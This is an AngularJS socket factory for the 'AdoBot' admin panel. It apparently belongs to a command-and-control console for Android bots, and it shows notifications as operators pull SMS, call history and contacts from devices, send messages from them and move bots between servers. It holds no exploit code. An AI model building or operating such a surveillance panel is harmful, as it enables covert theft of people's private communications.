angular.module('AdoBot')
  .factory('socket', [
    'socketFactory',
    'toastr',
    '$rootScope',
    function(socketFactory, toastr, $rootScope) {
      var reconnectTime = 5; //s
      var socket = socketFactory();

      socket.on('disconnect', function() {
        toastr.warning('Panel is offline', 'Disconnected');
        $rootScope.connected = false;
      });

      socket.on('connect', function() {
        socket.emit('admin');
        $rootScope.connected = true;
      });

      socket.on('reconnect', function() {
        socket.emit('admin');
        $rootScope.connected = true;
        toastr.clear();
        toastr.success('Panel is connected', 'Info');
      });

      socket.on('bot:created', function(data) {
        toastr.success('New device has connected', data.device);
      });

      socket.on('bot:connected', function(device) {
        toastr.success('Device has connected', device.device);
      });

      socket.on('bot:disconnected', function(device) {
        toastr.error('Device has disconnected', device.device);
      });

      socket.on('getmessages:started', function(device) {
        toastr.info('Get SMS started.', device.device);
      });

      socket.on('getmessages:done', function(device) {
        toastr.success('Done getting SMS.', device.device);
      });

      socket.on('getcallhistory:started', function(device) {
        toastr.info('Get call history started.', device.device);
      });

      socket.on('getcallhistory:done', function(device) {
        toastr.success('Done getting call history.', device.device);
      });

      socket.on('nopermission', function(data) {
        toastr.error('App is denied a permission: ' + data.permission, data.device);
      });

      socket.on('download:started', function(data) {
        toastr.info('Download started', data.device);
      });

      socket.on('download:completed', function(data) {
        toastr.success('Download completed', data.device);
      });

      socket.on('download:error', function(data) {
        toastr.error(data.error, data.device);
      });

      socket.on('getcontacts:started', function(data) {
        toastr.info('Get contacts started.', data.device);
      });

      socket.on('getcontacts:completed', function(data) {
        toastr.success('Get contacts completed.', data.device);
      });

      socket.on('command:unknown', function(data) {
        toastr.error('Unknown command: "' + data.command + '"', data.device);
      });

      socket.on('command:added', function (data) {
        toastr.info('Command is currently pending', 'Device is offline');
      });

      socket.on('sendmessage:success', function(data) {
        toastr.success("Message sent to " + data.phone + ": " + data.textmessage, data.device);
      });

      socket.on('sendmessage:failed', function(data) {
        toastr.error("Message send failed: " + data.message, data.device);
      });

      socket.on('transferbot:success', function(data) {
        toastr.success('Bot successfully transferred to ' + data.server, data.device);
      });

      socket.on('transferbot:failed', function(data) {
        toastr.error('Bot failed to transfer to ' + data.server + " Status Code: " + data.status, data.device);
      });

      socket.on('bot:transferring', function(data) {
        toastr.info('Bot is about to transfer to this server. Device: ' + data.device + " From: " + data.server);
      });

      socket.on('notify', function (data) {
        var type = data.type || 'info';
        toastr[type](data.message);
      });

      return socket;
    }
  ]);

